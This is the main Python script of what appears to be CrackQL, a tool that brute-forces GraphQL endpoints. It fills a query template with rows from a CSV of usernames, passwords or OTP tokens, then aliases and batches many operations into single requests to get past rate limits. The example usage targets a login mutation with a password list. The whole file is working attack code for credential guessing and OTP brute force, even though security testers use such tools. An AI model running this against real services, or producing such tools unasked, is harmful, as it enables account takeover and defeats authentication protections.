import sys
import os
import csv
import math
import requests
import json
import time
import jinja2
import graphql
import uuid

from optparse import OptionParser
from version import VERSION
from lib.validations import verify_url, verify_query, verify_inputs
from lib.parser import indent, get_root_type, get_csv_row_count, get_operation, parse_data_response, parse_error_response
from lib.generator import generate_payload, send_payload, stringify, intify, floatify
from lib.helpers import print_output
from graphql.language import print_ast
from pprint import pprint
from urllib.parse import urlparse


def main():
	# Get arguments

	parser = OptionParser(
		usage='%prog -t http://example.com/graphql -q sample-queries/login.graphql -i sample-inputs/users-and-passwords.csv -b 10 -a alias'
	)
	parser.add_option(
		'-t',
		'--target',
		dest='url',
		help='Target url with a path to the GraphQL endpoint'
	)
	parser.add_option(
		'-q',
		'--query',
		dest='query',
		help='Input query or mutation operation with variable payload markers'
	)
	parser.add_option(
		'-i',
		'--input-csv',
		dest='input_csv',
		help='Path to a csv list of arguments (i.e. usernames, emails, ids, passwords, otp_tokens, etc.)'
	)
	parser.add_option(
		'-d',
		'--delimiter',
		dest='delimiter',
		help='CSV input delimiter (default: ",")',
		default=','
	)
	parser.add_option(
		'-o',
		'--output-json',
		dest='output_json',
		action='store_true',
		help='Output data and error results to JSON files within a directory (default: results/[domain])[uuid]/',
	)
	parser.add_option(
		'-b',
		'--batch-size',
		dest='batch_size',
		help='Number of batch operations per GraphQL document request (default: 100)',
		default=1000
	)
	parser.add_option(
		'-a',
		'--alias-name',
		dest='alias_name',
		help='Prefix name of the alias used to batch query operations appended with auto incremented IDs (default: alias)',
		default='alias'
	)
	parser.add_option(
		'-D',
		'--delay',
		dest='delay',
		help='Time delay in seconds between batch requests (default: 0)',
		default=0
	)
	parser.add_option(
		'--verbose',
		action='store_true',
		dest='verbose',
		help='Prints out verbose messaging',
		default=False
	)

	parser.add_option(
		'-v',
		'--version',
		action='store_true',
		dest='version',
		help='Print out the current version and exit.',
		default=False
	)

	options, args = parser.parse_args()

	print('[+] Starting CrackQL...')

	# Verify required arguments exist

	if options.version:
		print('version:', VERSION)
		sys.exit(0)

	if not options.url:
		parser.error('Target URL (-t) not given')
		parser.print_help()
		sys.exit(1)

	if not options.query:
		parser.error('GraphQL query operation (-q) not given ')
		parser.print_help()
		sys.exit(1)

	if not options.input_csv:
		parser.error('Input file (-i) not given')
		parser.print_help()
		sys.exit(1)

	print_output('[*] Validating URL and CSV Inputs...', options.verbose)

	# Verify Target GraphQL Endpoint

	if not verify_url(options.url):
		sys.exit(1)

	# Verify Input CSV exists and is correct csv format

	if not verify_inputs(options.query, options.input_csv, options.delimiter):
		sys.exit(1)

	print_output('[*] Generating Batch Queries Payloads...', options.verbose)

	env = jinja2.Environment(autoescape=False)
	env.filters['str'] = stringify
	env.filters['int'] = intify
	env.filters['float'] = floatify

	with open(options.query, 'r') as file:
		query_data = file.read()

		# Store root operation type
		root_type = get_root_type(query_data)

		batch_operations = ''
		alias_id = 1
		batches_sent = 0
		csv_rows = get_csv_row_count(options.input_csv, options.delimiter)
		total_requests_to_send = math.ceil(csv_rows / int(options.batch_size))
		data_results = []
		error_results = []
		raw_data = []
		raw_errors = []
		initial_query = open(options.query, 'r').read()
		ast = None

		with open(options.input_csv, newline='') as csvfile:
			reader = csv.DictReader(csvfile, delimiter=options.delimiter, skipinitialspace=True)
			suffix = 0
			count = 0
			for variables in reader:
				count += 1
				template = env.from_string(initial_query)
				query = template.render(variables)
				ast = graphql.parse(query)

				"""Add Aliases to each field node"""
				for definition in ast.definitions:

					for a in definition.selection_set.selections:
						#print(a.name.value)
						suffix += 1
						aliased_field = 'alias' + str(suffix)
						a.alias = graphql.language.ast.NameNode()
						a.alias.value = aliased_field

					batch_operations = batch_operations +'\n'+ get_operation(print_ast(ast))

					if (count +1) > (int(options.batch_size) * (batches_sent + 1)):
						batches_sent += 1
						time.sleep(int(options.delay))
						payload = generate_payload(batch_operations, root_type)
						response = send_payload(options.url, payload, batches_sent, total_requests_to_send, options.verbose)
						raw_data, data_results = parse_data_response(response, raw_data, data_results, variables)
						raw_errors, error_results = parse_error_response(response, raw_errors, error_results, variables)
						batch_operations = ''

			if batches_sent != total_requests_to_send:
				batches_sent += 1
				time.sleep(int(options.delay))
				payload = generate_payload(batch_operations, root_type)
				response = send_payload(options.url, payload, batches_sent, total_requests_to_send, options.verbose)
				raw_data, data_results = parse_data_response(response, raw_data, data_results, variables)
				raw_errors, error_results = parse_error_response(response, raw_errors, error_results, variables)
				batch_operations = ''


			print_output('===============================\nResults:\n', options.verbose)

			if options.verbose:
				print("Data:")
				pprint(data_results)

				print("Errors:")
				pprint(error_results)

			if options.output_json:
				directory = options.output_json
			else:
				directory = 'results/' + urlparse(options.url).netloc + '_' + str(uuid.uuid4())[0:6]
			print('[*] Writing to directory', directory)
			if not os.path.exists(directory):
				os.mkdir(directory)

			if raw_data:
				f = open(directory + '/data.json', 'w')
				f.write(str(raw_data))
				f.close()

			if raw_errors:
				f = open(directory + '/errors.json', 'w')
				f.write(str(raw_errors))
				f.close()


if __name__ == '__main__':
    main()
